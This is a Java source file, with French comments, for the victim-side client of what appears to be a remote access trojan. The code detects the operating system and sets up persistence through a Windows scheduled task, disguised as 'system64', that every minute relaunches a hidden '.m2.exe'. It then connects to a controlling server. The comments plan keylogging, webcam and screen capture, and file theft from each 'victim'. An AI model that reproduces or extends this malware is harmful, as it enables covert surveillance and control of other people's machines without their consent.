import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;



public class Main {

	
	/* Best Viable Product : restant */
	// Envoi / réception de fichiers
	// Reglage des encodages pour windows (transmissions jusqu'au client) [OK]
	
	
	
	
	// LOG fichier [OK]
	// appels systï¿½mes [OK]
	// gestionnaire de taches 
	// Ajouts de fonctions prï¿½faites (ouvrir internet explorer, etc.)
		// client envoie/rï¿½ception de fichiers (entrï¿½e : chemin du fichier)
		// Envoyer captures webcam (socket UDP)
		// Envoyer captures ï¿½crans (socket UDP)
		// keylogger
	
	//Le menu sera codï¿½ pour chaque client victim, ce n'est pas le serveur qui doit s'en charger. Cela
	//rend aussi le projet plus gï¿½nï¿½rique, il faudra uniquement modidfier le code ï¿½ un seul endroit 
	// pour modifier le menu de la victime. [OK] -> au final le menu est codÃ© directement dans le client
	// utiisateur car ce  sont les commandes Ã  envoyer qui sont executÃ©es et qui peuvent etre formÃ©es dÃ¨s
	// le client utilisateur
	//Vï¿½rifier que la plannification windows fonctionne bien et coder la plannification Linux
	
	public static final String IP = "127.0.0.1";//"192.168.1.61";
	public static final int PORT = 2000;
	public static final int PORT_Fichiers = 3500;
	public static final long tempsEntreConnexions = 60*1000;//en millisecondes
	
	
	public static OS osactu = OS.linux;
	public static String encodingTerminal = "";

	public static boolean planificationEnabled = false;
	public static boolean logEnabled = false;
	
	public static String nomFichierProgramme = ".m2.exe";
	public static String nomDeLaTache = "system64";
	
	
	public static void main(String[] args) {
		// TODO Auto-generated method stub

		
		
		//Determination de l'OS sur lequel tourne le pc
		if(System.getProperty("os.name").trim().toLowerCase().startsWith("win")) {// Windows
			osactu = OS.windows;	
			Process p;
			try {
				p = Runtime.getRuntime().exec("cmd /c chcp");
				BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
				Main.encodingTerminal = getEncoding(b.readLine());
			} catch (IOException e) {
				// TODO Auto-generated catch block
				System.out.println("Détermination de l'encoding echoue : \n"+e.getMessage());
			}
		}else if(System.getProperty("os.name").trim().toLowerCase().startsWith("lin")){ //Linux
			osactu = OS.linux;
		}else {//apple
			osactu = OS.Maccintosh;
		}
		//-----
		
		//--- Plannification
		
		if(planificationEnabled) {
			if(Main.osactu.equals(OS.linux)) {
				
			} else if(Main.osactu.equals(OS.windows)) {
				Process p;
				try {
					p = Runtime.getRuntime().exec("cmd /c schtasks /Query /FO LIST | find \""+Main.nomDeLaTache+"\"");
					
					BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream(), Main.encodingTerminal));
					String recu = b.readLine();
					if(recu != null && recu.length() > 0) {
						System.out.println("Tache Existe deja  !");
						
					} else {
						System.out.println("N'existe pas encore");
						System.out.println("voila = "+recu);
						p = Runtime.getRuntime().exec("cmd /c echo %CD%"); // Pour windows
						b = new BufferedReader(new InputStreamReader(p.getInputStream(), Main.encodingTerminal));
						String path = b.readLine();
						path += "\\"+Main.nomFichierProgramme;
						String commande = "cmd /c schtasks /create /sc MINUTE /tn \""+Main.nomDeLaTache+"\" /tr "+path;
						
						Runtime.getRuntime().exec(commande);
						System.exit(0);
					}
					
					//Runtime.getRuntime().exec("cmd /c schtasks /create /sc onstart /tn \"system32\" /tr "+path);
					
					
					
					
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}
			
		}
		
		
		ClientVictim c = new ClientVictim( IP, PORT);
		//keylogger.closeBuffer();
		c.start();
		
	}


	private static String getEncoding(String readLine) {
		String [] tab = readLine.split(" ");
		String code = tab[4];		
		
		try{
			Integer.parseInt(code);
			code = "cp"+code;
		} catch (Exception e) {
			 System.out.println("WARNING : le code de l'encoding trouve par chcp n'était pas attendu. Code =  "+code);
		}
		return code;
	}

}
